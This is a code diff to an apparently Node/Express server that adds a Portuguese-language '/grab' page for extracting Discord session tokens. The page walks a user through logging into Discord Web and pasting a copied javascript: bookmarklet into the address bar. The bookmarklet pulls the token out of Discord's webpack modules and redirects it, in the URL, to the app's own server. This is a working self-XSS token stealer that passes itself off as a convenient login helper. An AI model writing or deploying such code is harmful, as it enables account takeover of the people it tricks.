@@ -362,6 +362,90 @@ app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', uptime: process.uptime() });
 });
 
+// Página grabber — link direto pra extrair token sem técnica
+app.get('/grab', (req, res) => {
+  const origin = `${req.protocol}://${req.get('host')}`;
+  const bookmarklet = `javascript:(function(){try{let t;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m of Object.keys(r.c)){if(r.c[m]?.exports?.default?.getToken!==undefined){t=r.c[m].exports.default.getToken();}}}]);if(!t){t=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();}if(t){window.location.href='${origin}/?token='+encodeURIComponent(t);}else{alert('Faca login em discord.com primeiro!');}}}catch(e){alert('Abra discord.com logado antes.');}})();`;
+
+  res.setHeader('Content-Type', 'text/html; charset=utf-8');
+  res.send(`<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Pegar Token — Discord</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#1e1f22;color:#f2f3f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:1.25rem}
+.card{background:#2b2d31;border:1px solid #383a40;border-radius:1rem;padding:1.75rem 1.5rem;max-width:380px;width:100%;text-align:center}
+.icon{font-size:2.5rem;margin-bottom:.75rem}
+h1{font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:.35rem}
+.sub{font-size:.75rem;color:#949ba4;margin-bottom:1.5rem}
+.step{display:none}.step.active{display:block}
+.btn{display:block;width:100%;padding:.9rem;border-radius:.75rem;font-size:.9rem;font-weight:700;border:none;cursor:pointer;transition:opacity .15s;text-decoration:none;text-align:center;margin-top:.75rem}
+.btn:active{opacity:.8}
+.btn-primary{background:#5865f2;color:#fff}
+.btn-green{background:#23a55a;color:#fff}
+.btn-dark{background:#1e1f22;color:#dbdee1;border:1px solid #383a40}
+.guide{background:#1e1f22;border:1px solid #383a40;border-radius:.75rem;padding:1rem;text-align:left;margin:1rem 0;font-size:.78rem;color:#b5bac1;line-height:1.8}
+.guide b{color:#fff}
+.guide ol{padding-left:1.25rem;margin-top:.4rem}
+.guide li{margin-bottom:.25rem}
+.badge{display:inline-block;background:#23a55a;color:#fff;border-radius:9999px;font-size:.65rem;font-weight:700;padding:.2rem .6rem;margin-bottom:1rem}
+.note{font-size:.68rem;color:#949ba4;margin-top:.6rem}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">🔑</div>
+  <h1>Pegar Token do Discord</h1>
+  <p class="sub">2 passos • funciona no iPhone sem saber senha</p>
+
+  <div class="step active" id="s1">
+    <div class="guide">
+      <b>Como funciona:</b>
+      <ol>
+        <li>Você copia o código aqui</li>
+        <li>Abre o Discord Web e entra com QR Code</li>
+        <li>Cola o código na barra de endereço</li>
+        <li>Você é redirecionada de volta ao app já logada ✅</li>
+      </ol>
+    </div>
+    <button class="btn btn-primary" onclick="copiar()">📋 Copiar Código Extrator</button>
+    <p class="note">Toque para copiar — depois vá ao Discord</p>
+  </div>
+
+  <div class="step" id="s2">
+    <span class="badge">✓ Código copiado!</span>
+    <div class="guide">
+      <b>Agora faça assim:</b>
+      <ol>
+        <li>Toque em <b>Abrir Discord Web</b> abaixo</li>
+        <li>Na tela de login toque em <b>"Login com QR Code"</b></li>
+        <li>No app do Discord → <b>Perfil → Scan QR</b> → escaneie</li>
+        <li>Assim que entrar, toque na <b>barra de endereço</b></li>
+        <li>Apague tudo e <b>cole</b> o código copiado</li>
+        <li>Toque em <b>Ir</b> — você volta aqui já logada! 🎉</li>
+      </ol>
+    </div>
+    <a href="https://discord.com/login" class="btn btn-green">Abrir Discord Web →</a>
+    <button class="btn btn-dark" onclick="copiar()">📋 Copiar código de novo</button>
+  </div>
+</div>
+<script>
+const CODE=${JSON.stringify(bookmarklet)};
+function copiar(){
+  navigator.clipboard.writeText(CODE).then(ok,()=>{prompt('Copie manualmente:',CODE);ok();});
+}
+function ok(){
+  document.getElementById('s1').classList.remove('active');
+  document.getElementById('s2').classList.add('active');
+}
+</script>
+</body>
+</html>`);
+});
+
 // Serve React build
 const distPath = path.join(__dirname, 'dist');
 if (fs.existsSync(distPath)) {
